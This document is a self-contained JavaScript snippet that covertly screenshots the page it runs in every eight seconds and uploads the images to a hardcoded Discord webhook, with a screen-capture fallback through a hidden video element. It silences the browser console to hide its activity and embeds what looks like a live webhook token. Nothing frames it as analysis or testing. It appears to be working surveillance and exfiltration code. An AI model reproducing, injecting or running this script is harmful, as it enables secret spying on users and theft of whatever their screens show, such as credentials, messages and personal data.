(function() {
    'use strict';

    if (window._t) {
        try { if (typeof window._t.kill === 'function') window._t.kill(); } catch(e) {}
        delete window._t;
    }

    var _webhook = 'https://discord.com/api/webhooks/1528640195078127749/35O0Xx21ArQS9hRR1gVQt685v2nxex7QChvdm9Kis59ecqpSUlnYopOdgA05179bAPDG';

    var _interval = null;
    var _running = false;
    var _visible = true;
    var _lastHash = null;
    var _cfg = { interval: 8000, quality: 0.6, scale: 0.8 };

    var _noop = function() {};
    var _orig = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };
    console.log = _noop;
    console.warn = _noop;
    console.error = _noop;
    console.info = _noop;
    console.debug = _noop;

    function _simpleHash(str) {
        var hash = 5381;
        for (var i = 0; i < str.length; i++) {
            hash = ((hash << 5) + hash) + str.charCodeAt(i);
            hash = hash & hash;
        }
        return (hash >>> 0).toString(16).toUpperCase().slice(0, 8);
    }

    function _nowBrasilia() {
        var now = new Date();
        var options = {
            timeZone: 'America/Sao_Paulo',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        };
        var formatter = new Intl.DateTimeFormat('pt-BR', options);
        var parts = formatter.formatToParts(now);
        var dateStr = parts.map(p => p.value).join('');
        var iso = now.toISOString();
        return { formatted: dateStr, iso: iso };
    }

    function _loadLib() {
        return new Promise(function(resolve) {
            if (typeof html2canvas !== 'undefined') { resolve(); return; }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
            s.onload = function() { resolve(); };
            s.onerror = function() { resolve(); };
            document.head.appendChild(s);
        });
    }

    function _toBlob(dataURL) {
        try {
            var parts = dataURL.split(',');
            var mime = parts[0].match(/:(.*?);/)[1];
            var bstr = atob(parts[1]);
            var n = bstr.length;
            var u8 = new Uint8Array(n);
            for (var i = 0; i < n; i++) {
                u8[i] = bstr.charCodeAt(i);
            }
            return new Blob([u8], { type: mime });
        } catch(e) {
            return null;
        }
    }

    function _send(dataURL) {
        try {
            var hash = _simpleHash(dataURL);
            if (hash === _lastHash) return Promise.resolve();
            _lastHash = hash;

            var blob = _toBlob(dataURL);
            if (!blob) return Promise.resolve();

            var brasilia = _nowBrasilia();
            var embed = {
                title: "📸 #" + hash,
                description: brasilia.formatted,
                color: 0x2b2d31,
                timestamp: brasilia.iso,
                footer: {
                    text: "Intervalo: " + (_cfg.interval / 1000) + "s"
                }
            };

            var payload = { embeds: [embed] };
            var fd = new FormData();
            fd.append('file', blob, hash + '.jpg');
            fd.append('payload_json', JSON.stringify(payload));

            return fetch(_webhook, { method: 'POST', body: fd }).catch(_noop);
        } catch(e) {
            return Promise.resolve();
        }
    }

    function _captureFallback() {
        return new Promise(function(resolve) {
            var video = document.createElement('video');
            video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
            document.body.appendChild(video);
            var stream = null;
            navigator.mediaDevices.getDisplayMedia({
                video: { cursor: 'never' },
                audio: false
            }).then(function(s) {
                stream = s;
                video.srcObject = s;
                video.onloadedmetadata = function() {
                    video.play();
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 1920;
                    canvas.height = video.videoHeight || 1080;
                    var ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
                    _send(dataURL).then(function() {
                        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                        video.pause();
                        video.srcObject = null;
                        video.remove();
                        resolve();
                    }).catch(function() {
                        if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
                        video.pause();
                        video.srcObject = null;
                        video.remove();
                        resolve();
                    });
                };
            }).catch(function() { resolve(); });
        });
    }

    function _capture() {
        if (_running || !_visible) return Promise.resolve();
        _running = true;
        return _loadLib()
            .then(function() {
                return html2canvas(document.body, {
                    scale: _cfg.scale,
                    useCORS: true,
                    logging: false,
                    backgroundColor: null,
                    allowTaint: true,
                    width: window.innerWidth,
                    height: Math.max(document.documentElement.scrollHeight, window.innerHeight)
                });
            })
            .then(function(canvas) {
                var dataURL = canvas.toDataURL('image/jpeg', _cfg.quality);
                return _send(dataURL);
            })
            .catch(function() { return _captureFallback(); })
            .then(function() { _running = false; })
            .catch(function() { _running = false; });
    }

    function _start() {
        if (_interval) return;
        _capture();
        _interval = setInterval(function() {
            if (_visible) _capture();
        }, _cfg.interval);
    }

    function _stop() {
        if (_interval) {
            clearInterval(_interval);
            _interval = null;
        }
    }

    function _kill() {
        _stop();
        _lastHash = null;
        document.removeEventListener('visibilitychange', _visibilityHandler);
        window.removeEventListener('blur', _blurHandler);
        window.removeEventListener('focus', _focusHandler);
        console.log = _orig.log;
        console.warn = _orig.warn;
        console.error = _orig.error;
        console.info = _orig.info;
        console.debug = _orig.debug;
        delete window._t;
    }

    function _visibilityHandler() {
        _visible = !document.hidden;
        if (_visible) _start(); else _stop();
    }

    function _blurHandler() {
        _visible = false;
        _stop();
    }

    function _focusHandler() {
        _visible = true;
        _start();
    }

    function _init() {
        document.addEventListener('visibilitychange', _visibilityHandler);
        window.addEventListener('blur', _blurHandler);
        window.addEventListener('focus', _focusHandler);
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            _start();
        } else {
            document.addEventListener('DOMContentLoaded', _start);
        }
    }

    window._t = {
        kill: _kill,
        start: _start,
        stop: _stop,
        capture: _capture
    };

    _init();

})();
